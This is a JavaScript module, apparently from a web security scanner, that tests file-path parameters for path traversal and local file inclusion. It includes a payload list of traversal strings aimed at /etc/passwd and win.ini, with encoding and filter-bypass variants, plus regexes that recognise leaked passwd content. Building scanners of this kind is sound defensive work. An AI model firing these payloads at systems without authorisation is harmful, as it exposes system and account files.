/**
 * Feature 7C — Path Traversal / Local File Inclusion (LFI) Scanner Module
 *
 * Targets file/path parameter names (heuristic).
 * Detects by matching known file content patterns in the response.
 */

import { sendProbe, extractParams, makeFinding } from './index.js';
import { PATH_PARAM_NAMES } from '#shared/webConstants.js';

// ─── Payloads ─────────────────────────────────────────────────────────────────

const LFI_PAYLOADS = [
  '../../etc/passwd',
  '../../../etc/passwd',
  '../../../../etc/passwd',
  '../../../../../etc/passwd',
  '../../../../../../etc/passwd',
  '....//....//....//etc/passwd',           // filter bypass
  '%2e%2e%2f%2e%2e%2fetc%2fpasswd',         // URL encoded
  '%252e%252e%252fetc%252fpasswd',           // Double URL encoded
  '..%5c..%5cwindows/win.ini',              // Windows backslash
  '..%5c..%5c..%5cwindows%5cwin.ini',
  '../../windows/win.ini',
  '/etc/passwd',                             // Absolute path
  'C:\\windows\\win.ini',                   // Windows absolute
  '../../../../../../../../etc/passwd',
];

const DETECTION_PATTERNS = [
  { pattern: /root:x:0:0:|daemon:x:|nobody:x:/, severity: 'critical', label: 'Unix /etc/passwd' },
  { pattern: /\[fonts\].*MSDOS=/is,            severity: 'critical', label: 'Windows win.ini' },
  { pattern: /\[fonts\]/i,                      severity: 'high',     label: 'Windows ini file' },
  { pattern: /root:.*:\/bin\//,                 severity: 'critical', label: 'Unix passwd file' },
];

// ─── Module runner ────────────────────────────────────────────────────────────

export async function runPathTraversal(target, opts) {
  const { signal, timeoutMs } = opts;
  const findings = [];
  const params   = extractParams(target);

  // Filter to file/path parameter names
  const pathParams = params.filter(p =>
    PATH_PARAM_NAMES.some(n => p.name.toLowerCase().includes(n.toLowerCase()))
  );

  if (!pathParams.length) return findings;

  // Baseline response length for size-delta detection
  let baselineLength = null;
  try {
    const base = await sendProbe(
      { method: target.method, url: target.url, headers: target.requestHeaders, body: target.body, timeoutMs },
      signal,
    );
    baselineLength = base.body.length;
  } catch {}

  for (const param of pathParams) {
    if (signal?.aborted) break;

    for (const payload of LFI_PAYLOADS) {
      if (signal?.aborted) break;
      if (findings.some(f => f.parameter === param.name && f.type === 'pathTraversal' && f.severity === 'critical')) break;

      const injected = param.inject(payload);
      try {
        const resp = await sendProbe(
          { method: injected.method || target.method, url: injected.url, headers: injected.requestHeaders || target.requestHeaders, body: injected.body, timeoutMs },
          signal,
        );

        // Check for known file content patterns
        for (const { pattern, severity, label } of DETECTION_PATTERNS) {
          if (pattern.test(resp.body)) {
            findings.push(makeFinding({
              severity,
              type:        'pathTraversal',
              title:       `Path Traversal / LFI — ${label} Read via parameter "${param.name}"`,
              description: `The "${param.name}" parameter is vulnerable to path traversal. The payload "${payload}" caused the server to read and return ${label}.`,
              url:         target.url,
              parameter:   param.name,
              payload,
              evidence:    {
                request:  `${target.method} ${target.url}`,
                response: resp.body.slice(0, 500),
              },
              remediation: 'Validate and sanitise file paths. Use a whitelist of allowed file names. Resolve paths using realpath() and ensure they are within the expected root directory.',
              references:  ['CWE-22', 'OWASP A01:2021'],
            }));
            break;
          }
        }

        // Size delta heuristic (significant response size increase may indicate file read)
        if (
          baselineLength !== null &&
          resp.statusCode === 200 &&
          resp.body.length > baselineLength + 100 &&
          !findings.some(f => f.parameter === param.name && f.type === 'pathTraversal')
        ) {
          findings.push(makeFinding({
            severity:    'high',
            type:        'pathTraversal',
            title:       `Potential Path Traversal in parameter "${param.name}" (response size delta)`,
            description: `Injecting "${payload}" into "${param.name}" produced a ${resp.body.length - baselineLength} byte larger response than the baseline, which may indicate successful file inclusion. Manual verification is needed.`,
            url:         target.url,
            parameter:   param.name,
            payload,
            evidence:    {
              request:      `${target.method} ${target.url}`,
              baselineSize: baselineLength,
              responseSize: resp.body.length,
              delta:        resp.body.length - baselineLength,
            },
            remediation: 'Validate and sanitise all file path parameters against an allowed list.',
            references:  ['CWE-22', 'OWASP A01:2021'],
          }));
        }
      } catch (err) {
        if (err.name === 'AbortError') return findings;
      }
    }
  }

  return findings;
}
